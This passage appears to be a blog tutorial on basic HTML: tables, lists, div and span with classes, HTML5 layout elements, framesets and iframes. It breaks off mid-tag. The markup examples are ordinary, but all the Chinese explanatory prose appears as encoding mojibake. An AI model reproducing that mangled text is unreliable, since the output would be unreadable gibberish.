æ¨ªè·¨è¡Œï¼šrowspanå±æ€§ &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;th&gt;å§“å&lt;/th&gt; &lt;td&gt;Miao&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th rowspan=\"2\"&gt;ç”µè¯&lt;/th&gt; &lt;td&gt;123456&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;654321&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; å§“å Miao ç”µè¯ 123456 654321 è¡¨æ ¼å†…æ ‡ç­¾&lt;table border=\"1\"&gt; &lt;tr&gt; &lt;td&gt; &lt;p&gt;è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚&lt;/p&gt; &lt;p&gt;è¿™æ˜¯å¦ä¸€ä¸ªæ®µè½ã€‚&lt;/p&gt; &lt;/td&gt; &lt;td&gt;è¿™ä¸ªå•å…ƒåŒ…å«ä¸€ä¸ªè¡¨æ ¼ï¼š &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;td&gt;A&lt;/td&gt; &lt;td&gt;B&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;C&lt;/td&gt; &lt;td&gt;D&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;è¿™ä¸ªå•å…ƒåŒ…å«ä¸€ä¸ªåˆ—è¡¨ï¼š &lt;ul&gt; &lt;li&gt;è‹¹æœ&lt;/li&gt; &lt;li&gt;é¦™è•‰&lt;/li&gt; &lt;li&gt;è è&lt;/li&gt; &lt;/ul&gt; &lt;/td&gt; &lt;td&gt;ä¸€å¼ å›¾ç‰‡ï¼š &lt;img src=\"FrontEnd_HTML_Basic/html5.jpg\" alt=\"HTML5\" /&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; è¿™æ˜¯ä¸€ä¸ªæ®µè½ã€‚ è¿™æ˜¯å¦ä¸€ä¸ªæ®µè½ã€‚ è¿™ä¸ªå•å…ƒåŒ…å«ä¸€ä¸ªè¡¨æ ¼ï¼š A B C D è¿™ä¸ªå•å…ƒåŒ…å«ä¸€ä¸ªåˆ—è¡¨ï¼š è‹¹æœ é¦™è•‰ è è ä¸€å¼ å›¾ç‰‡ï¼š å•å…ƒæ ¼è¾¹è·Cellpadding å•å…ƒæ ¼å†…å®¹ä¸å…¶è¾¹æ¡†ä¹‹é—´çš„ç©ºç™½ã€‚ &lt;table border=\"1\" cellpadding=\"20\"&gt; &lt;tr&gt; &lt;td&gt;First&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Second&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; First Row Second Row å•å…ƒæ ¼é—´è·cellspacing å¢åŠ å•å…ƒæ ¼ä¹‹é—´çš„è·ç¦»ã€‚ &lt;table border=\"1\" cellspacing=\"20\"&gt; &lt;tr&gt; &lt;td&gt;First&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Second&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; First Row Second Row è¡¨æ ¼/å•å…ƒæ ¼èƒŒæ™¯èƒŒæ™¯é¢œè‰²bgcolorå±æ€§ &lt;table border=\"1\" bgcolor=\"yellow\"&gt; &lt;tr&gt; &lt;td&gt;First&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Second&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; First Row Second Row èƒŒæ™¯å›¾åƒbackgroundå±æ€§ &lt;table border=\"1\" background=\"FrontEnd_HTML_Basic/html5.jpg\"&gt; &lt;tr&gt; &lt;td&gt;First&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Second&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; First Row Second Row å•å…ƒæ ¼èƒŒæ™¯åŒç†ï¼ŒåŠ åœ¨ç›¸åº”çš„tdæ ‡ç­¾é‡Œå³å¯ã€‚ä¾‹å¦‚ï¼š &lt;table border=\"1\"&gt; &lt;tr&gt; &lt;td bgcolor=\"blue\"&gt;First&lt;/td&gt; &lt;td&gt;Row&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; First Row æ’åˆ—å†…å®¹alignå±æ€§ &lt;table width=\"400\" border=\"1\"&gt; &lt;tr&gt; &lt;th align=\"center\"&gt;æ¶ˆè´¹é¡¹ç›®....&lt;/th&gt; &lt;th align=\"center\"&gt;ä¸€æœˆ&lt;/th&gt; &lt;th align=\"center\"&gt;äºŒæœˆ&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align=\"left\"&gt;è¡£æœ&lt;/td&gt; &lt;td align=\"right\"&gt;$241.10&lt;/td&gt; &lt;td align=\"right\"&gt;$50.20&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td align=\"left\"&gt;é£Ÿç‰©&lt;/td&gt; &lt;td align=\"right\"&gt;$730.40&lt;/td&gt; &lt;td align=\"right\"&gt;$650.00&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;th align=\"left\"&gt;æ€»è®¡&lt;/th&gt; &lt;th align=\"right\"&gt;$1001.50&lt;/th&gt; &lt;th align=\"right\"&gt;$744.65&lt;/th&gt; &lt;/tr&gt; &lt;/table&gt; æ¶ˆè´¹é¡¹ç›®.... ä¸€æœˆ äºŒæœˆ è¡£æœ $241.10 $50.20 é£Ÿç‰© $730.40 $650.00 æ€»è®¡ $1001.50 $744.65 æ¡†æ¶frameå±æ€§ &lt;p&gt;Table with frame=\"box\":&lt;/p&gt; &lt;table frame=\"box\"&gt; &lt;tr&gt; &lt;th&gt;Month&lt;/th&gt; &lt;th&gt;Savings&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;January&lt;/td&gt; &lt;td&gt;$100&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt;Table with frame=\"above\":&lt;/p&gt; &lt;table frame=\"above\"&gt; &lt;tr&gt; &lt;th&gt;Month&lt;/th&gt; &lt;th&gt;Savings&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;January&lt;/td&gt; &lt;td&gt;$100&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt;Table with frame=\"below\":&lt;/p&gt; &lt;table frame=\"below\"&gt; &lt;tr&gt; &lt;th&gt;Month&lt;/th&gt; &lt;th&gt;Savings&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;January&lt;/td&gt; &lt;td&gt;$100&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt;Table with frame=\"hsides\":&lt;/p&gt; &lt;table frame=\"hsides\"&gt; &lt;tr&gt; &lt;th&gt;Month&lt;/th&gt; &lt;th&gt;Savings&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;January&lt;/td&gt; &lt;td&gt;$100&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;p&gt;Table with frame=\"vsides\":&lt;/p&gt; &lt;table frame=\"vsides\"&gt; &lt;tr&gt; &lt;th&gt;Month&lt;/th&gt; &lt;th&gt;Savings&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;January&lt;/td&gt; &lt;td&gt;$100&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; Table with frame=\"box\": Month Savings January $100 Table with frame=\"above\": Month Savings January $100 Table with frame=\"below\": Month Savings January $100 Table with frame=\"hsides\": Month Savings January $100 Table with frame=\"vsides\": Month Savings January $100 è¡Œåˆ†ç»„thead å…ƒç´ åº”è¯¥ä¸ tbody å’Œ tfoot å…ƒç´ ç»“åˆèµ·æ¥ä½¿ç”¨ã€‚ï¼ˆä½†å¾ˆå°‘ä½¿ç”¨è¿™ä¸‰ä¸ªå…ƒç´ ï¼‰ tbody å…ƒç´ ç”¨äºå¯¹ HTML è¡¨æ ¼ä¸­çš„ä¸»ä½“å†…å®¹è¿›è¡Œåˆ†ç»„ï¼Œè€Œ tfoot å…ƒç´ ç”¨äºå¯¹ HTML è¡¨æ ¼ä¸­çš„è¡¨æ³¨ï¼ˆé¡µè„šï¼‰å†…å®¹è¿›è¡Œåˆ†ç»„ã€‚ theadã€tfoot ä»¥åŠ tbody å…ƒç´ ä½¿æ‚¨æœ‰èƒ½åŠ›å¯¹è¡¨æ ¼ä¸­çš„è¡Œè¿›è¡Œåˆ†ç»„ã€‚å½“æ‚¨åˆ›å»ºæŸä¸ªè¡¨æ ¼æ—¶ï¼Œæ‚¨ä¹Ÿè®¸å¸Œæœ›æ‹¥æœ‰ä¸€ä¸ªæ ‡é¢˜è¡Œï¼Œä¸€äº›å¸¦æœ‰æ•°æ®çš„è¡Œï¼Œä»¥åŠä½äºåº•éƒ¨çš„ä¸€ä¸ªæ€»è®¡è¡Œã€‚è¿™ç§åˆ’åˆ†ä½¿æµè§ˆå™¨æœ‰èƒ½åŠ›æ”¯æŒç‹¬ç«‹äºè¡¨æ ¼æ ‡é¢˜å’Œé¡µè„šçš„è¡¨æ ¼æ­£æ–‡æ»šåŠ¨ã€‚å½“é•¿çš„è¡¨æ ¼è¢«æ‰“å°æ—¶ï¼Œè¡¨æ ¼çš„è¡¨å¤´å’Œé¡µè„šå¯è¢«æ‰“å°åœ¨åŒ…å«è¡¨æ ¼æ•°æ®çš„æ¯å¼ é¡µé¢ä¸Šã€‚ &lt;thead&gt; å†…éƒ¨å¿…é¡»æ‹¥æœ‰ &lt;tr&gt; æ ‡ç­¾ï¼ &lt;table border=\"1\"&gt; &lt;thead style=\"color:green\"&gt; &lt;tr&gt; &lt;th&gt;Month&lt;/th&gt; &lt;th&gt;Savings&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody style=\"color:blue;height:50px\"&gt; &lt;tr&gt; &lt;td&gt;January&lt;/td&gt; &lt;td&gt;$100&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;February&lt;/td&gt; &lt;td&gt;$80&lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;tfoot style=\"color:red\"&gt; &lt;tr&gt; &lt;td&gt;Sum&lt;/td&gt; &lt;td&gt;$180&lt;/td&gt; &lt;/tr&gt; &lt;/tfoot&gt; &lt;/table&gt; Month Savings January $100 February $80 Sum $180 åˆ—åˆ†ç»„colæ ‡ç­¾ä¸ºè¡¨æ ¼ä¸­ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—å®šä¹‰å±æ€§å€¼ã€‚ col å…ƒç´ æ˜¯ä»…åŒ…å«å±æ€§çš„ç©ºå…ƒç´ ã€‚å¦‚éœ€åˆ›å»ºåˆ—ï¼Œæ‚¨å°±å¿…é¡»åœ¨ tr å…ƒç´ å†…éƒ¨è§„å®š td å…ƒç´ ã€‚ ä¾‹å¦‚ä¸ºè¡¨æ ¼ä¸­çš„ä¸‰ä¸ªåˆ—è§„å®šäº†ä¸åŒçš„å¯¹é½æ–¹å¼ï¼š &lt;table width=\"100%\" border=\"1\"&gt; &lt;col align=\"left\" /&gt; &lt;col align=\"left\" /&gt; &lt;col align=\"right\" /&gt; &lt;tr&gt; &lt;th&gt;ISBN&lt;/th&gt; &lt;th&gt;Title&lt;/th&gt; &lt;th&gt;Price&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;3476896&lt;/td&gt; &lt;td&gt;My first HTML&lt;/td&gt; &lt;td&gt;$53&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; ISBN Title Price 3476896 My first HTML $53 ï¼ˆç„¶è€Œæˆ‘ç”¨Firefoxã€Chromeã€Edgeéƒ½æ²¡æœ‰æ•ˆæœemmmmã€‚ colgroup æ ‡ç­¾ç”¨äºå¯¹è¡¨æ ¼ä¸­çš„åˆ—è¿›è¡Œç»„åˆï¼Œä»¥ä¾¿å¯¹å…¶è¿›è¡Œæ ¼å¼åŒ–ã€‚ å¦‚éœ€å¯¹å…¨éƒ¨åˆ—åº”ç”¨æ ·å¼ï¼Œ&lt;colgroup&gt;æ ‡ç­¾å¾ˆæœ‰ç”¨ï¼Œè¿™æ ·å°±ä¸éœ€è¦å¯¹å„ä¸ªå•å…ƒå’Œå„è¡Œé‡å¤åº”ç”¨æ ·å¼äº†ã€‚ &lt;colgroup&gt; æ ‡ç­¾åªèƒ½åœ¨ table å…ƒç´ ä¸­ä½¿ç”¨ã€‚ ä¾‹å¦‚ä¸¤ä¸ª colgroup å…ƒç´ ä¸ºè¡¨æ ¼ä¸­çš„ä¸‰åˆ—è§„å®šäº†ä¸åŒçš„å¯¹é½æ–¹å¼å’Œæ ·å¼ï¼ˆæ³¨æ„ç¬¬ä¸€ä¸ª colgroup å…ƒç´ æ¨ªè·¨ä¸¤åˆ—ï¼‰ï¼š &lt;table width=\"100%\" border=\"1\"&gt; &lt;colgroup span=\"2\" align=\"left\"&gt;&lt;/colgroup&gt; &lt;colgroup align=\"right\" style=\"color:#0000FF;\"&gt;&lt;/colgroup&gt; &lt;tr&gt; &lt;th&gt;ISBN&lt;/th&gt; &lt;th&gt;Title&lt;/th&gt; &lt;th&gt;Price&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;3476896&lt;/td&gt; &lt;td&gt;My first HTML&lt;/td&gt; &lt;td&gt;$53&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; ISBN Title Price 3476896 My first HTML $53 ï¼ˆç„¶è€Œæˆ‘è¿™é‡Œè¿˜æ˜¯æ²¡æœ‰æ•ˆæœemmm åˆ—è¡¨æ— åºåˆ—è¡¨Unordered list ï¼ˆè¿™é‡Œçš„æ ·å¼ä¹Ÿè¢«å…¨å±€çš„æ ·å¼ç»™å†²æ‰äº† emmm é¡¹ç›®åˆ—è¡¨ï¼Œé¡¹ç›®é»˜è®¤ä½¿ç”¨ç²—ä½“åœ†ç‚¹ï¼ˆå…¸å‹çš„å°é»‘åœ†åœˆï¼‰è¿›è¡Œæ ‡è®°ã€‚ &lt;ul&gt; &lt;li&gt;First item&lt;/li&gt; &lt;li&gt;Next item&lt;/li&gt; &lt;/ul&gt; First item Next item å¯ä»¥å®šä¹‰ä¸åŒçš„æ ·å¼ç±»å‹ã€‚ disc ç±»å‹&lt;ul type=\"disc\"&gt; &lt;li&gt;è‹¹æœ&lt;/li&gt; &lt;li&gt;é¦™è•‰&lt;/li&gt; &lt;li&gt;æŸ æª¬&lt;/li&gt; &lt;li&gt;æ¡”å­&lt;/li&gt; &lt;/ul&gt; è‹¹æœ é¦™è•‰ æŸ æª¬ æ¡”å­ circle ç±»å‹&lt;ul type=\"circle\"&gt; &lt;li&gt;è‹¹æœ&lt;/li&gt; &lt;li&gt;é¦™è•‰&lt;/li&gt; &lt;li&gt;æŸ æª¬&lt;/li&gt; &lt;li&gt;æ¡”å­&lt;/li&gt; &lt;/ul&gt; è‹¹æœ é¦™è•‰ æŸ æª¬ æ¡”å­ square ç±»å‹&lt;ul type=\"square\"&gt; &lt;li&gt;è‹¹æœ&lt;/li&gt; &lt;li&gt;é¦™è•‰&lt;/li&gt; &lt;li&gt;æŸ æª¬&lt;/li&gt; &lt;li&gt;æ¡”å­&lt;/li&gt; &lt;/ul&gt; è‹¹æœ é¦™è•‰ æŸ æª¬ æ¡”å­ æœ‰åºåˆ—è¡¨Ordered list åˆ—è¡¨é¡¹ç›®é»˜è®¤ä½¿ç”¨æ•°å­—è¿›è¡Œæ ‡è®°ã€‚ &lt;ol&gt; &lt;li&gt;First item&lt;/li&gt; &lt;li&gt;Next item&lt;/li&gt; &lt;/ol&gt; First item Next item æœ‰åºåˆ—è¡¨ä¹Ÿå¯ä»¥å®šä¹‰ä¸åŒçš„æ ·å¼ æ•°å­—åˆ—è¡¨&lt;ol type=\"1\"&gt; &lt;li&gt;è‹¹æœ&lt;/li&gt; &lt;li&gt;é¦™è•‰&lt;/li&gt; &lt;li&gt;æŸ æª¬&lt;/li&gt; &lt;li&gt;æ¡”å­&lt;/li&gt; &lt;/ol&gt; è‹¹æœ é¦™è•‰ æŸ æª¬ æ¡”å­ å­—æ¯åˆ—è¡¨å¤§å†™å­—æ¯ &lt;ol type=\"A\"&gt; &lt;li&gt;è‹¹æœ&lt;/li&gt; &lt;li&gt;é¦™è•‰&lt;/li&gt; &lt;li&gt;æŸ æª¬&lt;/li&gt; &lt;li&gt;æ¡”å­&lt;/li&gt; &lt;/ol&gt; è‹¹æœ é¦™è•‰ æŸ æª¬ æ¡”å­ å°å†™å­—æ¯æ”¹æˆ &lt;ol type=\"a\"&gt; å³å¯ã€‚ ç½—é©¬å­—æ¯åˆ—è¡¨&lt;ol type=\"I\"&gt; &lt;li&gt;è‹¹æœ&lt;/li&gt; &lt;li&gt;é¦™è•‰&lt;/li&gt; &lt;li&gt;æŸ æª¬&lt;/li&gt; &lt;li&gt;æ¡”å­&lt;/li&gt; &lt;/ol&gt; è‹¹æœ é¦™è•‰ æŸ æª¬ æ¡”å­ å°å†™ç½—é©¬å­—æ¯åˆ™ä¸º &lt;ol type=\"i\"&gt; ã€‚ è‹¹æœ é¦™è•‰ æŸ æª¬ å®šä¹‰åˆ—è¡¨Definition list è‡ªå®šä¹‰åˆ—è¡¨ä¸ä»…ä»…æ˜¯ä¸€åˆ—é¡¹ç›®ï¼Œè€Œæ˜¯é¡¹ç›®åŠå…¶æ³¨é‡Šçš„ç»„åˆã€‚ è‡ªå®šä¹‰åˆ—è¡¨ä»¥ &lt;dl&gt; æ ‡ç­¾å¼€å§‹ã€‚æ¯ä¸ªè‡ªå®šä¹‰åˆ—è¡¨é¡¹ä»¥ &lt;dt&gt; å¼€å§‹ã€‚æ¯ä¸ªè‡ªå®šä¹‰åˆ—è¡¨é¡¹çš„å®šä¹‰ä»¥ &lt;dd&gt; å¼€å§‹ã€‚ &lt;dl&gt; &lt;dt&gt;First term&lt;/dt&gt; &lt;dd&gt;Definition&lt;/dd&gt; &lt;dt&gt;Next term&lt;/dt&gt; &lt;dd&gt;Definition&lt;/dd&gt; &lt;/dl&gt; First term Definition Next term Definition åµŒå¥—åˆ—è¡¨&lt;ul&gt; &lt;li&gt;å’–å•¡&lt;/li&gt; &lt;li&gt;èŒ¶ &lt;ul&gt; &lt;li&gt;çº¢èŒ¶&lt;/li&gt; &lt;li&gt;ç»¿èŒ¶ &lt;ul&gt; &lt;li&gt;ä¸­å›½èŒ¶&lt;/li&gt; &lt;li&gt;éæ´²èŒ¶&lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li&gt;ç‰›å¥¶&lt;/li&gt; &lt;/ul&gt; å’–å•¡ èŒ¶ çº¢èŒ¶ ç»¿èŒ¶ ä¸­å›½èŒ¶ éæ´²èŒ¶ ç‰›å¥¶ å—å¯ä»¥é€šè¿‡ &lt;div&gt; å’Œ &lt;span&gt; å°† HTML å…ƒç´ ç»„åˆèµ·æ¥ã€‚ å¤§å¤šæ•° HTML å…ƒç´ è¢«å®šä¹‰ä¸ºå—çº§å…ƒç´ æˆ–å†…è”å…ƒç´ ã€‚â€œå—çº§å…ƒç´ â€ block level elementï¼Œâ€œå†…è”å…ƒç´ â€ inline elementã€‚ å—çº§å…ƒç´ åœ¨æµè§ˆå™¨æ˜¾ç¤ºæ—¶ï¼Œé€šå¸¸ä¼šä»¥æ–°è¡Œæ¥å¼€å§‹ï¼ˆå’Œç»“æŸï¼‰ã€‚ å†…è”å…ƒç´ åœ¨æ˜¾ç¤ºæ—¶é€šå¸¸ä¸ä¼šä»¥æ–°è¡Œå¼€å§‹ã€‚ div å…ƒç´ division/section å¯ä»¥è¯´æ˜¯æœ€å¸¸ç”¨çš„å—çº§å…ƒç´ 8ã€‚å¯ç”¨äºç»„åˆå…¶ä»– HTML å…ƒç´ çš„å®¹å™¨ã€‚ å®ƒæ²¡æœ‰ç‰¹å®šçš„å«ä¹‰ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œç”±äºå®ƒå±äºå—çº§å…ƒç´ ï¼Œæµè§ˆå™¨ä¼šåœ¨å…¶å‰åæ˜¾ç¤ºæŠ˜è¡Œã€‚ å¦‚æœä¸ CSS ä¸€åŒä½¿ç”¨ï¼Œ&lt;div&gt; å…ƒç´ å¯ç”¨äºå¯¹å¤§çš„å†…å®¹å—è®¾ç½®æ ·å¼å±æ€§ã€‚ &lt;div&gt; å…ƒç´ çš„å¦ä¸€ä¸ªå¸¸è§çš„ç”¨é€”æ˜¯æ–‡æ¡£å¸ƒå±€ã€‚ span å…ƒç´ å†…è”å…ƒç´ ï¼Œå¯ç”¨ä½œæ–‡æœ¬çš„å®¹å™¨ã€‚ ä¹Ÿæ²¡æœ‰ç‰¹å®šçš„å«ä¹‰ã€‚ ä¹Ÿå¯ä»¥ä¸ CSS ä¸€åŒä½¿ç”¨ï¼Œæ¥ç»™éƒ¨åˆ†æ–‡æœ¬å®šä¹‰æ ·å¼å±æ€§ã€‚ ç±»classå±æ€§ å¯ä»¥ç”¨æ¥ç»™åŒä¸€ç±»å…ƒç´ è®¾ç½®ç›¸åŒçš„æ ·å¼ã€‚ è®¾ç½® &lt;div&gt; å…ƒç´ çš„ç±»ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸ºç›¸åŒçš„ &lt;div&gt; å…ƒç´ è®¾ç½®ç›¸åŒçš„æ ·å¼ï¼š &lt;style&gt; .miaotest { background-color:pink; color:white; margin:20px; padding:20px; } &lt;/style&gt; &lt;div class=\"miaotest\"&gt; &lt;p&gt;London&lt;/p&gt; &lt;p&gt;London is the capital city of England. It is the most populous city in the United Kingdom, with a metropolitan area of over 13 million inhabitants.&lt;/p&gt; &lt;/div&gt; &lt;div class=\"miaotest\"&gt; &lt;p&gt;Paris&lt;/p&gt; &lt;p&gt;Paris is the capital and most populous city of France.&lt;/p&gt; &lt;/div&gt; .miaotest { background-color:pink; color:white; margin:20px; padding:20px; } London London is the capital city of England. It is the most populous city in the United Kingdom, with a metropolitan area of over 13 million inhabitants. Paris Paris is the capital and most populous city of France. åŒç†ï¼Œä¹Ÿå¯ä»¥è®¾ç½® &lt;span&gt; å…ƒç´ çš„classå±æ€§æ¥å¯¹ç›¸åŒç±»è®¾ç½®æ ·å¼ã€‚ &lt;style&gt; span.redtest {color:red;} &lt;/style&gt; &lt;p&gt;My &lt;span class=\"redtest\"&gt;Important&lt;/span&gt; Things&lt;/p&gt; span.redtest {color:red;} My Important Things ç½‘é¡µå¸ƒå±€è¿™é‡Œ HTML5 æ–°å¢äº†ä¸å°‘è¯­ä¹‰åŒ–å…ƒç´ ï¼Œæ›¿ä»£äº†åŸå…ˆ &lt;div id=\"xxx\"&gt;è¿™æ ·å®šä¹‰ç½‘é¡µå¸ƒå±€çš„å½¢å¼ã€‚ å…·ä½“çš„è¯­ä¹‰å…ƒç´ æ˜¯è¿™æ ·çš„ã€‚ è¯­ä¹‰å…ƒç´  å«ä¹‰ header å®šä¹‰æ–‡æ¡£æˆ–èŠ‚çš„é¡µçœ‰ nav å®šä¹‰å¯¼èˆªé“¾æ¥çš„å®¹å™¨ section å®šä¹‰æ–‡æ¡£ä¸­çš„èŠ‚ article å®šä¹‰ç‹¬ç«‹çš„è‡ªåŒ…å«æ–‡ç«  aside å®šä¹‰å†…å®¹ä¹‹å¤–çš„å†…å®¹ï¼ˆæ¯”å¦‚ä¾§æ ï¼‰ footer å®šä¹‰æ–‡æ¡£æˆ–èŠ‚çš„é¡µè„š details å®šä¹‰é¢å¤–çš„ç»†èŠ‚ summary å®šä¹‰ details å…ƒç´ çš„æ ‡é¢˜ ä¾‹å¦‚ï¼š &lt;body&gt; &lt;header&gt; &lt;h1&gt;City Gallery&lt;/h1&gt; &lt;/header&gt; &lt;nav&gt; London&lt;br&gt; Paris&lt;br&gt; Tokyo&lt;br&gt; &lt;/nav&gt; &lt;section&gt; &lt;h1&gt;London&lt;/h1&gt; &lt;p&gt; London is the capital city of England. It is the most populous city in the United Kingdom, with a metropolitan area of over 13 million inhabitants. &lt;/p&gt; &lt;p&gt; Standing on the River Thames, London has been a major settlement for two millennia, its history going back to its founding by the Romans, who named it Londinium. &lt;/p&gt; &lt;/section&gt; &lt;footer&gt; Copyright W3School.com.cn &lt;/footer&gt; &lt;/body&gt; å…·ä½“åé¢å†çœ‹çœ‹ HTML5 çš„æ–°è¯­ä¹‰å…ƒç´ å§ï¼ˆ æ¡†æ¶é€šè¿‡ä½¿ç”¨æ¡†æ¶ï¼Œå¯ä»¥åœ¨åŒä¸€ä¸ªæµè§ˆå™¨çª—å£ä¸­æ˜¾ç¤ºä¸æ­¢ä¸€ä¸ªé¡µé¢ã€‚ æ¯ä»½HTMLæ–‡æ¡£ç§°ä¸ºä¸€ä¸ªæ¡†æ¶ï¼Œå¹¶ä¸”æ¯ä¸ªæ¡†æ¶éƒ½ç‹¬ç«‹äºå…¶ä»–çš„æ¡†æ¶ã€‚ ç»“æ„æ¡†æ¶æ ‡ç­¾ framesetframesetæ ‡ç­¾ / æ¡†æ¶é›† å®ƒå®šä¹‰äº†å¦‚ä½•å°†çª—å£åˆ†å‰²ä¸ºæ¡†æ¶ã€‚æ¯ä¸ª frameset å®šä¹‰äº†ä¸€ç³»åˆ— è¡Œ æˆ– åˆ—ã€‚ rows/columns çš„å€¼è§„å®šäº†æ¯è¡Œæˆ–æ¯åˆ—å æ®å±å¹•çš„é¢ç§¯ã€‚ æ¡†æ¶æ ‡ç­¾ frameframe æ ‡ç­¾å®šä¹‰äº†æ”¾ç½®åœ¨æ¯ä¸ªæ¡†æ¶ä¸­çš„ HTML æ–‡æ¡£ã€‚ ä¾‹å¦‚ï¼Œä¸‹é¢è¿™ä¸ªä¾‹å­å®šä¹‰äº†ä¸€ä¸ªä¸¤åˆ—æ¡†æ¶é›†ï¼Œç¬¬ä¸€åˆ—å çª—å£çš„25%ï¼Œæ˜¾ç¤ºframe_a.htmï¼›ç¬¬äºŒåˆ—å 75%ï¼Œæ˜¾ç¤ºframe_b.htmã€‚ &lt;html&gt; &lt;frameset cols=\"25%,75%\"&gt; &lt;frame src=\"frame_a.htm\"&gt; &lt;frame src=\"frame_b.htm\"&gt; &lt;/frameset&gt; &lt;/html&gt; å‡å¦‚ä¸€ä¸ªæ¡†æ¶æœ‰å¯è§è¾¹æ¡†ï¼Œç”¨æˆ·å¯ä»¥æ‹–åŠ¨è¾¹æ¡†æ¥æ”¹å˜å®ƒçš„å¤§å°ã€‚ä¸ºäº†é¿å…è¿™ç§æƒ…å†µå‘ç”Ÿï¼Œå¯ä»¥åœ¨ &lt;frame&gt; æ ‡ç­¾ä¸­åŠ å…¥ï¼šnoresize=\"noresize\"ã€‚ å³ï¼ˆæ­¤å¤„åˆ†æˆä¸¤è¡Œrowsï¼‰ &lt;frameset rows=\"25%,75%\"&gt; &lt;frame src=\"frame_a.htm\" noresize=\"noresize\"&gt; &lt;frame src=\"frame_b.htm\"&gt; &lt;/frameset&gt; noframes æ ‡ç­¾ä¸èƒ½å°† &lt;body&gt;&lt;/body&gt; æ ‡ç­¾ä¸ &lt;frameset&gt;&lt;/frameset&gt; æ ‡ç­¾åŒæ—¶ä½¿ç”¨ï¼ ä¸è¿‡ï¼Œå‡å¦‚æ·»åŠ åŒ…å«ä¸€æ®µæ–‡æœ¬çš„ &lt;noframes&gt; æ ‡ç­¾ï¼Œå°±å¿…é¡»å°†è¿™æ®µæ–‡å­—åµŒå¥—äº &lt;body&gt;&lt;/body&gt; æ ‡ç­¾å†…ã€‚ &lt;html&gt; &lt;frameset cols=\"25%,50%,25%\"&gt; &lt;frame src=\"/example/html/frame_a.html\"&gt; &lt;frame src=\"/example/html/frame_b.html\"&gt; &lt;frame src=\"/example/html/frame_c.html\"&gt; &lt;noframes&gt; &lt;body&gt;æ‚¨çš„æµè§ˆå™¨æ— æ³•å¤„ç†æ¡†æ¶ï¼&lt;/body&gt; &lt;/noframes&gt; &lt;/frameset&gt; &lt;/html&gt; æ··åˆæ¡†æ¶ç»“æ„&lt;html&gt; &lt;frameset rows=\"50%,50%\"&gt; &lt;frame src=\"/example/html/frame_a.html\"&gt; &lt;frameset cols=\"25%,75%\"&gt; &lt;frame src=\"/example/html/frame_b.html\"&gt; &lt;frame src=\"/example/html/frame_c.html\"&gt; &lt;/frameset&gt; &lt;/frameset&gt; &lt;/html&gt; å†…åµŒæ¡†æ¶Iframe ç”¨äºåœ¨ç½‘é¡µå†…æ˜¾ç¤ºç½‘é¡µã€‚ height å’Œ width å±æ€§ç”¨äºè§„å®š iframe çš„é«˜åº¦å’Œå®½åº¦ã€‚ å±æ€§å€¼çš„é»˜è®¤å•ä½æ˜¯åƒç´ ï¼Œä½†ä¹Ÿå¯ä»¥ç”¨ç™¾åˆ†æ¯”æ¥è®¾å®šï¼ˆæ¯”å¦‚ â€œ80%â€ï¼‰ã€‚ å¯¹äºä¸æ”¯æŒiframeçš„æµè§ˆå™¨ï¼Œå¯ä»¥æŠŠéœ€è¦çš„æç¤ºæ–‡æœ¬æ”¾ç½®åœ¨ &lt;iframe&gt; å’Œ &lt;/iframe&gt; ä¹‹é—´ã€‚ æ¯”å¦‚è¿™é‡ŒåµŒå¥—äº†ä¸€ä¸ªæˆ‘çš„åšå®¢é¦–é¡µï¼ˆå¥—å¨ƒå˜»å˜»å˜» &lt;iframe src=\"https://miaotony.xyz\" width=\"600\" 